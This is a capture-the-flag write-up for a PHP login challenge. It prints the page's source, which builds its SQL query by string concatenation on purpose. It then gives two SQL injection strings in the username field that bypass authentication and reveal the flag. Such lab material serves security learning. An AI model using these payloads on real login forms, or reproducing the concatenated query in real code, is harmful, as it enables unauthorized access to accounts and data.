# Web: I don't like needles

## Challenge
> They make me SQueaL!
> http://challs.houseplant.riceteacatpanda.wtf:30001
> Dev: Tom

## Solution
The name of the challenge seems to be related to SQL injection.\
The webpage contains an authentication form. The HTML source contains an interesting comment.\

``` html
<!DOCTYPE html>
<html>
<head>
    <title>Super secure login portal</title>

    <style>
        .container {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
        }

        body {
            font-family: sans-serif;
        }

    </style>

</head>
<body>

    <div class="container">
    <h1>Super secure login portal</h1>

    <!-- ?sauce -->

    
    <form method="POST">
        <span>Username: </span><input type="text" name="username">
        <br>
        <br>
        <span>Password: </span><input type="password" name="password">
        <br>
        <br>
        <input type="submit">
    </form>
    </div>

</body>
</html>
```

Connecting to `http://challs.houseplant.riceteacatpanda.wtf:30001/?sauce` webpage you can read the source code.\

```php
<?php

    // error_reporting(0);

    if (isset($_GET['sauce'])) {
        show_source("index.php");
        die();
    }

?>

<!DOCTYPE html>
<html>
<head>
    <title>Super secure login portal</title>

    <style>
        .container {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
        }

        body {
            font-family: sans-serif;
        }

    </style>

</head>
<body>

    <div class="container">
    <h1>Super secure login portal</h1>

    <!-- ?sauce -->

    <?php

        if ($_SERVER['REQUEST_METHOD'] == "POST") {
            
            require("config.php");

            if (isset($_POST["username"]) && isset($_POST["password"])) {

                $username = $_POST["username"];
                $password = $_POST["password"];

                if (strpos($password, "1") !== false) {
                    echo "<p style='color: red;'>Auth fail :(</p>";
                } else {

                    $connection = new mysqli($SQL_HOST, $SQL_USER, $SQL_PASS, $SQL_DB);
                    $result = mysqli_query($connection, "SELECT * FROM users WHERE username='" . $username . "' AND password='" . $password . "'", MYSQLI_STORE_RESULT);
                    
                    if ($result === false) {
                        echo "<p style='color: red;'>I don't know what you did but it wasn't good.</p>";
                    } else {
                        if ($result->num_rows != 0) {
                            if (mysqli_fetch_array($result, MYSQLI_ASSOC)["username"] == "flagman69") {
                                echo "<p style='color: green;'>" . $FLAG . " :o</p>";
                            } else {
                                echo "<p style='color: green;'>Logged in :)</p>";
                            }
                        } else {
                            echo "<p style='color: red;'>Auth fail :(</p>";
                        }
                    }
                    
                }
            }
        }

    ?>

    <form method="POST">
        <span>Username: </span><input type="text" name="username">
        <br>
        <br>
        <span>Password: </span><input type="password" name="password">
        <br>
        <br>
        <input type="submit">
    </form>
    </div>

</body>
</html>
```
- Try:
`username=flagman69'or'1'='1--&password=admin`
Or\
`username=flagman69'#&password=`

Flag: `rtcp{y0u-kn0w-1-didn't-mean-it-like-th@t}`

